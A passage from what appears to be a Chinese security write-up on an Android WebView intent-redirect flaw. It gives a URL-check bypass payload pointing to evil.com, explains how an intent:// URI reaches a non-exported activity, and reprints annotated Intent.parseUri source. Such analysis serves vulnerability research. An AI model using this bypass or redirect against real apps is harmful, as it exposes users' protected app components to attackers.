+</div><p><code>if</code>条件部分可以绕过。payload: <code>http://toutiao.com@evil.com/poc.htm</code></p>
+<p>在<code>shouldOverrideUrlLoading</code>中可以看到，传入的是<code>intent</code>协议时可以发生跳转。<strong>即一次intent重定向</strong>,使用这次intent重定向可以打开<code>export=false</code>的TestActivity界面。</p>
+<p><code>Intent.parseUri()</code>方法的第二个参数flag有三种类型：<code>Intent.URI_ANDROID_APP_SCHEME</code> 和 <code>Intent.URI_INTENT_SCHEME</code> 还有 <code>URI_ALLOW_UNSAFE</code>；第三种不安全，一般不使用。</p>
+<p>前俩种的格式为<code>intent://host/#Intent;scheme=hansel;package=com.hansel.app;end</code> 和 <code>android-app://{package_id}[/{scheme}[/{host}[/{path}]]][#Intent;{…}]</code>
+<code>Intent.parseUri()</code>源码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Intent</span> <span class="nf">parseUri</span><span class="o">(</span><span class="n">String</span> <span class="n">uri</span><span class="o">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">URISyntaxException</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">androidApp</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;android-app:&#34;</span><span class="o">);</span>
+
+ <span class="c1">// flag传入URI_INTENT_SCHEME这个条件成立，生成的是自定义的scheme协议，非intent://和app-android://,所以上面把自定义的scheme加入URI_INTENT_SCHEME即可
+</span><span class="c1"></span>            <span class="k">if</span> <span class="o">((</span><span class="n">flags</span><span class="o">&amp;(</span><span class="n">URI_INTENT_SCHEME</span><span class="o">|</span><span class="n">URI_ANDROID_APP_SCHEME</span><span class="o">))</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(!</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;intent:&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">androidApp</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="n">ACTION_VIEW</span><span class="o">);</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="n">intent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">uri</span><span class="o">));</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalArgumentException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">throw</span> <span class="k">new</span> <span class="n">URISyntaxException</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+                    <span class="o">}</span>
+                    <span class="k">return</span> <span class="n">intent</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+            <span class="c1">// 看下是否有#Intent后续的参数内容
+</span><span class="c1"></span>            <span class="n">i</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">lastIndexOf</span><span class="o">(</span><span class="s">&#34;#&#34;</span><span class="o">);</span>
+            <span class="c1">// simple case
+</span><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">i</span> <span class="o">==</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(!</span><span class="n">androidApp</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">return</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="n">ACTION_VIEW</span><span class="o">,</span> <span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">uri</span><span class="o">));</span>
+                <span class="o">}</span>
+
+            <span class="c1">// old format Intent URI
+</span><span class="c1"></span>            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;#Intent;&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(!</span><span class="n">androidApp</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">return</span> <span class="n">getIntentOld</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">flags</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                    <span class="n">i</span> <span class="o">=</span> <span class="o">-</span><span class="n">1</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+
+            <span class="c1">// new format
+</span><span class="c1"></span>            <span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="n">ACTION_VIEW</span><span class="o">);</span>
+            <span class="n">Intent</span> <span class="n">baseIntent</span> <span class="o">=</span> <span class="n">intent</span><span class="o">;</span>
+            <span class="kt">boolean</span> <span class="n">explicitAction</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span><span class="c1">// 指定action
+</span><span class="c1"></span>            <span class="kt">boolean</span> <span class="n">inSelector</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+
+            <span class="c1">// fetch data part, if present
+</span><span class="c1"></span>            <span class="n">String</span> <span class="n">scheme</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="n">String</span> <span class="n">data</span><span class="o">;</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+                <span class="n">i</span> <span class="o">+=</span> <span class="n">8</span><span class="o">;</span> <span class="c1">// length of &#34;#Intent;&#34;
+</span><span class="c1"></span>            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">uri</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="c1">// 获取#Intent后面的附加属性
+</span><span class="c1"></span>            <span class="c1">// loop over contents of Intent, all name=value;
+</span><span class="c1"></span>            <span class="k">while</span> <span class="o">(</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="n">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;end&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                <span class="kt">int</span> <span class="n">eq</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">&#39;=&#39;</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">eq</span> <span class="o">&lt;</span> <span class="n">0</span><span class="o">)</span> <span class="n">eq</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="n">1</span><span class="o">;</span>
+                <span class="kt">int</span> <span class="n">semi</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">&#39;;&#39;</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+                <span class="n">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">eq</span> <span class="o">&lt;</span> <span class="n">semi</span> <span class="o">?</span> <span class="n">Uri</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">eq</span> <span class="o">+</span> <span class="n">1</span><span class="o">,</span> <span class="n">semi</span><span class="o">))</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+
+                <span class="c1">// action
+</span><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;action=&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(!</span><span class="n">inSelector</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">explicitAction</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+
+                <span class="c1">// categories
+</span><span class="c1"></span>                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;category=&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">intent</span><span class="o">.</span><span class="na">addCategory</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
+                <span class="o">}</span>
+
+                <span class="c1">// type
+</span><span class="c1"></span>                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;type=&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">intent</span><span class="o">.</span><span class="na">mType</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
+                <span class="o">}</span>
+
+                <span class="c1">// launch flags
+</span><span class="c1"></span>                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;launchFlags=&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">intent</span><span class="o">.</span><span class="na">mFlags</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">value</span><span class="o">).</span><span class="na">intValue</span><span class="o">();</span>
+                    <span class="k">if</span> <span class="o">((</span><span class="n">flags</span><span class="o">&amp;</span> <span class="n">URI_ALLOW_UNSAFE</span><span class="o">)</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">intent</span><span class="o">.</span><span class="na">mFlags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">IMMUTABLE_FLAGS</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+
+                <span class="c1">// package
+</span><span class="c1"></span>                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;package=&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">intent</span><span class="o">.</span><span class="na">mPackage</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
+                <span class="o">}</span>
+
+                <span class="c1">// component
+</span><span class="c1"></span>                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;component=&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">intent</span><span class="o">.</span><span class="na">mComponent</span> <span class="o">=</span> <span class="n">ComponentName</span><span class="o">.</span><span class="na">unflattenFromString</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
+                <span class="o">}</span>
+
+                <span class="c1">// scheme
+</span><span class="c1"></span>                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;scheme=&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">inSelector</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">intent</span><span class="o">.</span><span class="na">mData</span> <span class="o">=</span> <span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">value</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span><span class="o">);</span>
+                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        <span class="n">scheme</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+
+                <span class="c1">// source bounds
+</span><span class="c1"></span>                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;sourceBounds=&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">intent</span><span class="o">.</span><span class="na">mSourceBounds</span> <span class="o">=</span> <span class="n">Rect</span><span class="o">.</span><span class="na">unflattenFromString</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
+                <span class="o">}</span>
+
+                <span class="c1">// selector
+</span><span class="c1"></span>                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">semi</span> <span class="o">==</span> <span class="o">(</span><span class="n">i</span><span class="o">+</span><span class="n">3</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;SEL&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+                    <span class="n">inSelector</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+                <span class="o">}</span>
+
+                <span class="c1">// extra
+</span><span class="c1"></span>                <span class="k">else</span> <span class="o">{</span>
+                    <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="n">Uri</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">2</span><span class="o">,</span> <span class="n">eq</span><span class="o">));</span>
+                    <span class="c1">// create Bundle if it doesn&#39;t already exist
+</span><span class="c1"></span>                    <span class="k">if</span> <span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">mExtras</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="n">intent</span><span class="o">.</span><span class="na">mExtras</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Bundle</span><span class="o">();</span>
+                    <span class="n">Bundle</span> <span class="n">b</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">mExtras</span><span class="o">;</span>
+                    <span class="c1">// add EXTRA
+</span><span class="c1"></span>                    <span class="k">if</span>      <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;S.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;B.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putBoolean</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">parseBoolean</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;b.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putByte</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Byte</span><span class="o">.</span><span class="na">parseByte</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;c.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putChar</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">));</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;d.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putDouble</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Double</span><span class="o">.</span><span class="na">parseDouble</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;f.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putFloat</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Float</span><span class="o">.</span><span class="na">parseFloat</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;i.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putInt</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;l.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putLong</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;s.&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="n">b</span><span class="o">.</span><span class="na">putShort</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Short</span><span class="o">.</span><span class="na">parseShort</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
+                    <span class="k">else</span> <span class="k">throw</span> <span class="k">new</span> <span class="n">URISyntaxException</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="s">&#34;unknown EXTRA type&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+                <span class="o">}</span>
+
+                <span class="c1">// move to the next item
+</span><span class="c1"></span>                <span class="n">i</span> <span class="o">=</span> <span class="n">semi</span> <span class="o">+</span> <span class="n">1</span><span class="o">;</span>
+            <span class="o">}</span>
+
+            <span class="k">if</span> <span class="o">(</span><span class="n">inSelector</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">// The Intent had a selector; fix it up.
+</span><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">baseIntent</span><span class="o">.</span><span class="na">mPackage</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">baseIntent</span><span class="o">.</span><span class="na">setSelector</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="n">intent</span> <span class="o">=</span> <span class="n">baseIntent</span><span class="o">;</span>
+            <span class="o">}</span>
+
+            <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;intent:&#34;</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">7</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">scheme</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">data</span> <span class="o">=</span> <span class="n">scheme</span> <span class="o">+</span> <span class="sc">&#39;:&#39;</span> <span class="o">+</span> <span class="n">data</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;android-app:&#34;</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">12</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">data</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">13</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="c1">// Correctly formed android-app, first part is package name.
+</span><span class="c1"></span>                        <span class="kt">int</span> <span class="n">end</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">&#39;/&#39;</span><span class="o">,</span> <span class="n">14</span><span class="o">);</span>
+                        <span class="k">if</span> <span class="o">(</span><span class="n">end</span> <span class="o">&lt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="c1">// All we have is a package name.
+</span><span class="c1"></span>                            <span class="n">intent</span><span class="o">.</span><span class="na">mPackage</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">14</span><span class="o">);</span>
+                            <span class="k">if</span> <span class="o">(!</span><span class="n">explicitAction</span><span class="o">)</span> <span class="o">{</span><span class="c1">//没有action属性的时候“app-android”使用默认action_main
+</span><span class="c1"></span>                                <span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="n">ACTION_MAIN</span><span class="o">);</span>
+                            <span class="o">}</span>
+                            <span class="n">data</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                            <span class="c1">// Target the Intent at the given package name always.
+</span><span class="c1"></span>                            <span class="n">String</span> <span class="n">authority</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+                            <span class="n">intent</span><span class="o">.</span><span class="na">mPackage</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">14</span><span class="o">,</span> <span class="n">end</span><span class="o">);</span>
